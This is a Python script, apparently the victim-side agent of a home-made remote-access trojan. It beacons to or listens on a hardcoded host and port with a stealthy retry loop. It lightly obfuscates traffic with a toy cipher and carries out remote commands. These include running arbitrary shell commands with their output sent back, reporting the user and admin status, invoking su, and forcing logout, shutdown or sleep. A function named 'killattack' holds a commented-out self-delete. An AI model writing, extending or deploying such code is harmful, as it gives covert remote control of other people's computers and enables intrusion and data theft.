#!/usr/bin/env python
#FOR PYTHON 3
__version__ = '0.3'
import socket, cmd, getpass, os, argparse, time, platform, subprocess

IP = '127.0.0.1'
PORT = 6000
SYSTEM = platform.system()
idlist = subprocess.check_output('id').decode('utf-8').split()
ADMINCHECK = idlist[1]

# Things I learned:
# Shebang line
# Popen and subprocess
# Dont use applescript
# su and setuid()
# activate caps lock led on mac
# Const, default value must have const

def encode_with_key(string, key):#Encrypting and decrypting
    list_of_numbers = ''
    for letter in string:
        list_of_numbers += str(ord(letter)*key) + ' '
    return list_of_numbers.encode()

def decode_with_key(byte, key):
    string_of_bytes = ''
    list_of_bytes = (byte.decode('utf-8')).split()
    for b in list_of_bytes:
        string_of_bytes += chr(int(int(b)//key))
    return string_of_bytes

class recv_commands(cmd.Cmd):
    def __init__(self, key, server, system):#VERY IMPORTANT lets me use key and socket outside main
        self.key = key
        self.server = server
        self.system = system
    def do_exit(self, arg):
        return 0#To make continue_loop 0
    def do_loggedin(self, arg):
        message = encode_with_key(str(getpass.getuser()), self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)#Makes sure that lenofmsg is exactly 5 long by adding zeros
        print('loggedin', lenofmsg)
        self.server.send(str(lenofmsg).encode())
        self.server.send(message)
        return 1
    def do_WHOAMI(self, arg):
        message = encode_with_key(str(getpass.getuser()), self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('whoami', lenofmsg)
        self.server.send(str(lenofmsg).encode())
        self.server.send(message)
        return 1
    def do_volume(self, arg):
        os.system('osascript -e \'set volume '+arg+'\'')#Uses applescript
        os.system('osascript -e \'get volume settings\'')#To see actual volume as set volume is not very reliable
        print('volume '+ arg)
        return 1
    def do_say(self, arg):
        os.system('say ' + str(arg))
        print('say ' + arg)
        return 1
    def do_logout(self, arg):
        print('logout')
        if self.system == 'Windows':
            os.system('shutdown -l -f')
        else:
            os.system('osascript -e \'tell application \"loginwindow\" to «event aevtrlgo»\'')
        return 1
    def do_shutdown(self, arg):
        print('shutdown')
        if self.system == 'Windows':
            os.system('shutdown -s -f')
        else:
            os.system('osascript -e \'tell app \"System Events\" to shut down\'')
        return 1
    def do_sleep(self, arg):
        print('sleep')
        if self.system == 'Windows':
            os.system('psshutdown -d')
        elif self.system == 'Darwin':
            os.system('osascript -e \'tell app "System Events" to sleep\'')
        else:#Last one is Linux
            os.system('xset -display :0.0 dpms force off')
        return 1
    def do_exec(self, arg):
        print('exec '+ str(arg))
        args = arg.split()
        try:
            exec(args)
        except:
            pass
        return 1
    def do_cmd(self, arg):
        args = arg.split()
        try:
            message = encode_with_key(str(subprocess.check_output(args).decode('utf-8')), self.key)
        except:
            message = encode_with_key('!Command Failed!', self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('system cmd', lenofmsg)
        self.server.send(str(lenofmsg).encode())
        self.server.send(message)
        return 1
    def do_admin(self, arg):
        if ADMINCHECK == 'staff':
            message = 'You are in an admin account.'
        else:
            message = 'You are not in an admin account.'
        message = encode_with_key(str(message), self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('admin', lenofmsg)
        self.server.send(str(lenofmsg).encode())
        self.server.send(message)
        return 1
    def do_su(self, arg):
        if ADMINCHECK == 'staff':
            os.system('su')
        print('su')
        return 1
    def do_system(self, arg):
        message = encode_with_key(self.system, self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('system', lenofmsg)
        self.server.send(str(lenofmsg).encode())
        self.server.send(message)
        return 1
    def do_uname(self, arg):
        lenofmsg = ''
        if len(arg) > 0:
            message = platform.uname()[int(arg)]#Returns named tuple
        else:
            message = platform.uname()
            for i in range(6):#Stringing together named tuple
                lenofmsg += message[i] + ' '
            message = lenofmsg
        message = encode_with_key(str(message), self.key)
        lenofmsg = str(len(message))
        lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
        print('uname' + str(arg), lenofmsg)
        self.server.send(str(lenofmsg).encode())
        self.server.send(message)
        return 1
    def do_killattack(self, arg):
        pathtofile = os.path.abspath(__file__)
        print(pathtofile)
        #os.remove(pathtofile)
        return 0

def main():
    #CLEAR UP MAIN FUNC
    continue_loop = 1#Stopping the cmdone loop uses this var
    #Setting up runmode
    runmode = argparse.ArgumentParser(description='Get runmode')
    runmode.add_argument('-a', '--active', action='store_true')#runmode for active(reaching out to the other side)
    runmode.add_argument('-p', '--passive', action='store_true')#runmode for passive(waiting to receive connection)
    mode = vars(runmode.parse_args())#Turns into dict
    print(mode)

    #Setting up socket
    if mode['active'] == True and mode['passive'] == True:
        print('Not a valid input')
        raise SystemExit
    elif mode['active'] == True:
        while True:
            time.sleep(2)#To not use a noticadable amount of cpu
            try:
                server = socket.socket()
                server.connect((IP, PORT))
                break
            except:
                pass
    else:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
        connect.bind((IP, PORT))
        connect.listen(1)
        server, addr = connect.accept()
    '''while True:#For multiple requests
        server, addr = server.accept()
        lenofmsg = int(server.recv(2).decode('utf-8'))
        key = round(int(round(int(server.recv(lenofmsg).decode('utf-8'))**(1/2))))#Sqrt of key
        print('key', key)
        continue_loop = 1#Stopping the loop uses this var
        while continue_loop:
            lenofmsg_rtrnd = int(server.recv(5).decode('utf-8'))#Standard protocol for my project
            msg_recvd = str(decode_with_key(server.recv(lenofmsg_rtrnd), key))#Then receive real msg
            print('message recvd', msg_recvd)
            continue_loop = recv_commands(key, server).onecmd(msg_recvd)
        print('Bye')
        server.close()'''
    lenofmsg = int(server.recv(2).decode('utf-8'))
    KEY = round(int(round(int(server.recv(lenofmsg).decode('utf-8'))**(1/2))))#Sqrt of key
    lenofmsg = str(len(str(platform.system()).encode()))
    lenofmsg = ('0' * (2-len(lenofmsg))) + str(lenofmsg)
    server.send(lenofmsg.encode())#Send os len
    server.send(platform.system().encode('utf-8'))#Send os
    print('key', KEY)
    while continue_loop:#investigate do while
        lenofmsg = int(server.recv(5).decode('utf-8'))#Standard protocol for my project
        msg_recvd = str(decode_with_key(server.recv(lenofmsg), KEY))#Then receive real msg
        print('message recvd', msg_recvd)
        continue_loop = recv_commands(KEY, server, SYSTEM).onecmd(msg_recvd)
    print('Bye')
    server.close()

if __name__ == '__main__':
    main()
